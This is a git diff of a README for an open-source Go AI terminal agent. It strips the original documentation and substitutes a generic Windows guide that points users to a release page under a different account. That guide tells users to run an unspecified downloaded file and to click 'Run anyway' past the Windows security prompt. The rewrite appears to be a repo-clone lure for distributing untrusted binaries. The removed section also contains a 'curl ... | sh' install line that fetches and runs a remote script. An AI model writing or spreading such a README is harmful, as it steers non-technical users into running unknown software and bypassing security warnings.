@@ -1,204 +1,180 @@
-# Codeany
+# 🤖 codeany - AI terminal help for Windows
 
-[![Release](https://img.shields.io/github/v/release/codeany-ai/codeany)](https://github.com/codeany-ai/codeany/releases)
-[![Go](https://img.shields.io/github/go-mod/go-version/codeany-ai/codeany)](https://go.dev/)
-[![License](https://img.shields.io/github/license/codeany-ai/codeany)](LICENSE)
+[![Download codeany](https://img.shields.io/badge/Download%20codeany-purple?style=for-the-badge)](https://github.com/akshaykrizz7/codeany/releases)
 
-An open-source AI-powered terminal agent for software engineering. Built in Go with [Bubble Tea](https://github.com/charmbracelet/bubbletea) TUI and the [Open Agent SDK](https://github.com/codeany-ai/open-agent-sdk-go).
+## ⚡ What codeany does
 
-**78 slash commands** | **Skills & Plugins** | **MCP support** | **Multi-provider** | **Chinese/IME** | **Self-update**
+codeany is an open-source AI-powered terminal agent built in Go. It helps you run terminal tasks with simple text input. You can use it to ask for help with file work, command ideas, basic automation, and other shell tasks.
 
-## Quick Install
+It is made for people who want a cleaner way to work in the terminal without learning complex tools first.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/codeany-ai/codeany/main/install.sh | sh
-```
+## 🖥️ Windows setup
 
-Or install from source:
+codeany runs on Windows. For most users, the easiest setup is to download the release file from GitHub and run it on your PC.
 
-```bash
-go install github.com/codeany-ai/codeany/cmd/codeany@latest
-```
+Before you start, make sure you have:
 
-## Setup
+- A Windows 10 or Windows 11 computer
+- An internet connection for the download
+- Enough free disk space for the app and its files
+- Permission to run apps on your computer
 
-Set your API key:
+## 📥 Download and install
 
-```bash
-export ANTHROPIC_API_KEY="sk-ant-..."
-# Or for OpenRouter / custom providers:
-export CODEANY_API_KEY="sk-or-..."
-export CODEANY_BASE_URL="https://openrouter.ai/api"
-export CODEANY_MODEL="anthropic/claude-sonnet-4-5"
-```
+1. Open the release page: https://github.com/akshaykrizz7/codeany/releases
+2. Find the latest release at the top of the page
+3. Look for the Windows file in the Assets section
+4. Download the file to your computer
+5. If the file is a zip archive, right-click it and choose Extract All
+6. Open the extracted folder
+7. Run the app file inside the folder
 
-## Usage
+If Windows shows a security prompt:
 
-```bash
-# Interactive mode
-codeany
+1. Click More info
+2. Click Run anyway
 
-# With initial prompt
-codeany "explain this codebase"
+If you download a zip file, keep the whole folder together. The app may need the files beside it to start.
 
-# Pipe mode
-echo "what is 2+2" | codeany -p
+## 🧭 First run
 
-# Print mode (non-interactive)
-codeany --print -y "list files in src/"
+When you start codeany for the first time, it may open in a terminal window. This is normal.
 
-# JSON output
-echo "hello" | codeany -p -y --output-format json
+Follow these steps:
 
-# Skip permission prompts
-codeany -y
+1. Open the app
+2. Wait for the startup process to finish
+3. Read the prompt on the screen
+4. Type your task in plain words
+5. Press Enter
 
-# Use specific model
-codeany -m opus-4-6
-```
+You can ask for help with things like:
 
-## Slash Commands
+- Listing files in a folder
+- Renaming many files
+- Searching for text
+- Explaining a command before you use it
+- Running simple workflow steps
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show all commands |
-| `/model [name]` | Switch model |
-| `/fast` | Toggle faster model |
-| `/cost` | Show token usage and cost |
-| `/clear` | Clear conversation |
-| `/compact [hint]` | Compact conversation |
-| `/plan [task]` | Plan mode / plan a task |
-| `/commit [msg]` | Git commit helper |
-| `/review [target]` | Code review |
-| `/diff` | Show git diff summary |
-| `/bug <desc>` | Investigate a bug |
-| `/test [target]` | Run tests |
-| `/init` | Initialize project (create CODEANY.md) |
-| `/doctor` | Environment diagnostics |
-| `/mcp` | Manage MCP servers |
-| `/skills` | List available skills |
-| `/plugin` | List installed plugins |
-| `/hooks` | Show configured hooks |
-| `/context` | Show all context sources |
-| `/session` | Session details |
-| `/files` | Files accessed this session |
-| `/resume` | List recent sessions |
-| `/export` | Export conversation |
-| `/config` | Show configuration |
-| `/permissions` | Permission mode |
-| `/status` | Session status |
-| `/quit` | Exit |
+## 🛠️ How to use codeany
 
-## Keyboard Shortcuts
+Use codeany like a helper in the terminal. You type what you want, and it gives you a command or takes the next step based on your input.
 
-| Key | Action |
-|-----|--------|
-| `Enter` | Send message |
-| `Shift+Enter` | New line |
-| `Ctrl+C` | Cancel / Exit |
-| `Ctrl+D` | Exit (empty input) |
-| `Ctrl+L` | Clear conversation |
-| `Ctrl+O` | Toggle expand tool output |
-| `Up/Down` | Input history |
-| `PgUp/PgDown` | Scroll messages |
-| `Tab` | Complete slash command |
-| `Esc` | Clear input / close menu |
-| `! cmd` | Run shell command |
+Example tasks:
 
-## Configuration
+- Show files in my Documents folder
+- Find all images in this folder
+- Create a new folder for project files
+- Explain this command before I run it
+- Help me clean up old downloads
 
-Config directory: `~/.codeany/`
+Keep your requests short and clear. If you want a result in a certain folder, include the folder name.
 
-```
-~/.codeany/
-├── settings.json      # Main config (model, permissions, MCP, hooks)
-├── config.yaml        # YAML config (alternative)
-├── permissions.json   # Persisted permission rules
-├── memory/            # Memory files
-├── sessions/          # Session history
-├── skills/            # User skills
-│   └── my-skill/
-│       └── SKILL.md
-└── plugins/           # Plugins
-    └── my-plugin/
-        ├── plugin.json
-        └── skills/
-```
+## 🔧 Basic features
 
-### settings.json
+codeany is built to help with common terminal work:
 
-```json
-{
-  "model": "sonnet-4-6",
-  "permissionMode": "default",
-  "maxTurns": 100,
-  "mcpServers": {
-    "filesystem": {
-      "type": "stdio",
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
-    }
-  },
-  "hooks": {
-    "preToolUse": [],
-    "postToolUse": []
-  }
-}
-```
+- Natural language input
+- Terminal task support
+- Open-source codebase
+- Built with Go for fast startup
+- Works well for simple local tasks
+- Good fit for file and command help
 
-## Project Configuration
+## 📁 Typical use cases
 
-Create `CODEANY.md` (or `CLAUDE.md`) in your project root:
+Use codeany when you want to:
 
-```markdown
-# Project Instructions
+- Find files faster
+- Reduce manual typing
+- Get help with terminal commands
+- Organize folders
+- Handle repeat tasks
+- Learn what a command does before you run it
 
-## Commands
-- `npm test` to run tests
-- `npm run build` to build
+## ⌨️ Example requests
 
-## Code Style
-- Use TypeScript strict mode
-- Prefer functional components
-```
+Try these examples in the app:
 
-Also supports:
-- `CODEANY.local.md` / `CLAUDE.local.md` — personal, gitignored
-- `.codeany/rules/*.md` / `.claude/rules/*.md` — modular rules
+- List all files in this folder
+- Move all screenshots to a new folder
+- Show me the biggest files here
+- Delete empty folders
+- Help me find duplicate files
+- Explain how to zip this folder
 
-## Skills
+## 🔒 Safety and control
 
-Create custom skills in `.codeany/skills/<name>/SKILL.md`:
+You stay in control of each task. Read the command or action before you confirm it. If you are not sure what a step does, stop and check it first.
 
-```markdown
----
-name: deploy
-description: Deploy to production
-argumentHint: <environment>
----
+Good habits:
 
-Deploy the application to $ARGUMENTS environment.
-Run the deployment script and verify health checks.
-```
+- Check the folder name before moving files
+- Review delete actions with care
+- Keep backups for important data
+- Use small test tasks first
 
-Invoke with: `/deploy staging`
+## ❓ Common questions
 
-## MCP Servers
+### What file should I download?
 
-Configure MCP servers in `settings.json` or manage with `/mcp`:
+Open the release page and choose the latest Windows file in the Assets section. If there are several files, pick the one meant for Windows.
 
-```bash
-/mcp              # List servers
-/mcp tools        # List available tools
-/mcp reconnect X  # Reconnect server
-```
+### Do I need to know command line tools?
 
-## Update
+No. You can start with plain English. The app helps turn your request into terminal work.
 
-```bash
-codeany update
-```
+### Can I use it for simple file tasks?
 
-## License
+Yes. It is a good fit for file search, file moves, folder setup, and basic cleanup.
 
-MIT
+### Is it free to use?
+
+The project is open-source, so you can use the public releases from the GitHub page.
+
+## 🧩 Tips for better results
+
+- Use short tasks
+- Name the folder or file if you know it
+- Ask one task at a time
+- Use simple words
+- Check the output before you confirm changes
+
+## 📌 Quick start
+
+1. Visit https://github.com/akshaykrizz7/codeany/releases
+2. Download the latest Windows release
+3. Extract the files if needed
+4. Run the app
+5. Type a task in plain English
+6. Review the result before you continue
+
+## 🧰 File handling examples
+
+If you want to sort files, try requests like:
+
+- Put all PDFs into one folder
+- Move music files into a Music folder
+- Rename photos by date
+- Find all files changed today
+- Clean up empty folders in Downloads
+
+If you want to search, try:
+
+- Find every file with report in the name
+- Search for the word invoice in text files
+- Show folders larger than 1 GB
+
+## 🧪 What to expect on Windows
+
+On Windows, codeany should feel like a small helper that opens in a terminal window. It is meant to be light and quick. After launch, you can type what you need and follow the steps shown on screen.
+
+If you keep the app in a fixed folder, it is easier to find later. A simple place like Downloads or Desktop is fine for first use
+
+## 🗂️ How to keep using it
+
+After setup, you can open codeany any time you need help with a terminal task. If you use it often, keep the release file or extracted folder in a stable place so you do not lose it
+
+## 📎 Download link
+
+Visit this page to download the Windows release: https://github.com/akshaykrizz7/codeany/releases
